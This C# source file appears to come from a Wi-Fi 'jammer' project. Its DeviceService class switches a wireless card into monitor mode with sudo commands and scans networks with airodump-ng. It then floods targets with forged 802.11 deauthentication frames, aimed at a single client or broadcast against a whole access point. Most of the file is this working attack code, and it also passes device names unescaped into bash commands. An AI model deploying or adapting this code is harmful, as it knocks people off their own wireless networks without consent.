using System.Threading.Tasks;
using System.Globalization;
using System.Threading;
using System;
using SharpPcap;
using SharpPcap.LibPcap;
using CliWrap;
using CliWrap.Buffered;
using JammerV1.Models;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics.Contracts;

public class DeviceService : IDeviceService {

    private IInjectionDevice _captureDevice = null;

    public IInjectionDevice CaptureDevice { get => _captureDevice; }

    public async Task<bool> IsDeviceInMonitorMode(string deviceName) {
        // Trying to avoid dependency on aircrack-ng suite - use iwconfig with CliWrap.
        var stdOutBuffer = new StringBuilder();
        var result = await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"iwconfig {deviceName} | grep Mode:Monitor"})
            .ExecuteBufferedAsync();
        return result.StandardOutput.Contains("Mode:Monitor");
    }

    public async Task<bool> SetMonitorMode(string deviceName) {
        // Need to bring down the interface first
        await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo ifconfig {deviceName} down"})
            .ExecuteAsync();

        // Now put the interface into monitor mode
        var cmd = Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo iwconfig {deviceName} mode monitor"});
        var result = await cmd.ExecuteAsync();

        // Put interface back up
        await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo ifconfig {deviceName} up"})
            .ExecuteAsync();
        return result.ExitCode == 0;
    }


    public async Task OpenDevice()
    {
        // TODO: Here, going to need checks for: permissions, no device available, device can't do monitor mode
        // Step 1 - check if any device is already in monitor mode - best case scenario
        // Step 2 - Try to send a dummy packet to test if the device can inject packets
        // Step 3 - Loop through remaning devices which passed the above test, and try to put them into monitor mode.

        foreach(var device in CaptureDeviceList.Instance) {
            try {
                if (await IsDeviceInMonitorMode(device.Name)) {
                    Console.WriteLine($"Already found {device.Name} in monitor mode, will use that");
                    _captureDevice = device as IInjectionDevice; // Set the capture device here if needed
                    return;
                }
            } catch (Exception) { }
        }
        
        foreach(var device in CaptureDeviceList.Instance) {
            // wlan0 capable of injection on my debian dev machine!! WTF!!
            if (device.Name == "wlan0") {continue;}
            device.Open(DeviceModes.Promiscuous);
            try {
                // See if the device can inject packets
                byte[] dummyPacket = new byte[64];
                Array.Clear(dummyPacket, 0, dummyPacket.Length);
                device.SendPacket(dummyPacket);
                await SetMonitorMode(device.Name);
                _captureDevice =  device as IInjectionDevice;
                device.Close();
                return;

            } catch (PcapException) { }
              finally { device.Close(); }
        }
    }

    public async Task JamClient(Client client) {
        using (var device = _captureDevice) {
            device.Open(DeviceModes.Promiscuous);
            // Need to parse the AP BSSID (string -> bytes)
            string[] bssidParts = client.BSSID.Split(":");
            byte[] bssidBytes = new byte[bssidParts.Length];
            for (int i = 0; i < bssidParts.Length; i++)
            {
                bssidBytes[i] = byte.Parse(bssidParts[i], NumberStyles.HexNumber);
            }

            string[] stationMacParts = client.StationMAC.Split(":");
            byte[] stationMacBytes = new byte[stationMacParts.Length];
            for (int i = 0; i < stationMacParts.Length; i++)
            {
                stationMacBytes[i] = byte.Parse(stationMacParts[i], NumberStyles.HexNumber);
            }

            byte[] deauthFrame = new byte[] {
                    0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, // Radiotap header - junk
                    0xc0, // Type / subtype - De-authentication
                    0x00, 0x3a, 0x01, // Duration Garbage
                    stationMacBytes[0], stationMacBytes[1], stationMacBytes[2], stationMacBytes[3], stationMacBytes[4], stationMacBytes[5], // Destination address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // Source Address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // BSSID (Target AP MAC)
                    0x00, 0x48, // Sequence garbage
                    0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
            };
            try
            {
                while (client.IsJammed)
                {
                    await Task.Delay(100);
                    device.SendPacket(deauthFrame);
                }
            }
            catch (PcapException ex) { Console.WriteLine("Got a PcapException - {0}", ex); }
        }
    }

    public async Task JamAP(AP ap) { 
        // Need to parse the AP BSSID (string -> bytes)
        using (var device = _captureDevice) {
            device.Open(DeviceModes.Promiscuous);
            string[] parts = ap.BSSID.Split(":");
            byte[] bssidBytes = new byte[parts.Length];
            for (int i = 0; i < parts.Length; i++)
            {
                bssidBytes[i] = byte.Parse(parts[i], NumberStyles.HexNumber);
            }
            byte[] deauthFrame = new byte[] {
                    0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, // Radiotap header - junk
                    0xc0, // Type / subtype - De-authentication
                    0x00, 0x3a, 0x01, // Duration Garbage
                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // Source Address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // BSSID (Target AP MAC)
                    0x00, 0x48, // Sequence garbage
                    0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
            };
            try
            {
                while (ap.IsJammed)
                {
                    await Task.Delay(100);
                    device.SendPacket(deauthFrame);
                }
            }
            catch (PcapException ex) { Console.WriteLine("Got a PcapException - {0}", ex); }
        }
    }

    public async Task Scan(int secondsToRun) {
        // First, use airodump-ng to get raw output
        using var cancellation_token = new CancellationTokenSource();
        var airodumpCmd = Cli.Wrap("airodump-ng")
            .WithArguments($"-a --write-interval 1 -w {Constants.Paths.BaseDirectory}/jammer {_captureDevice.Name}");

        cancellation_token.CancelAfter(TimeSpan.FromSeconds(secondsToRun));

        // Execute airodump-ng command with handling for cancellation
        try
        {
            await airodumpCmd.ExecuteAsync(cancellation_token.Token);
        }
        catch (OperationCanceledException) { }

        // Now run the sed command to filter output
        try
        {
            var sedCmd = Cli.Wrap("sed")
                .WithArguments(new[] {
                    "-e", "/^[[:space:]]*$/d",
                    "-e", "/^BSSID/d",  
                    "-e", "/^Station MAC/d",
                    Constants.Paths.DirtyJammerOutputFilePath
                })
                .WithStandardOutputPipe(PipeTarget.ToFile(Constants.Paths.CleanedJammerOutputFilePath));

            var result = await sedCmd.ExecuteBufferedAsync();
        }
        catch (Exception) { }
    }
}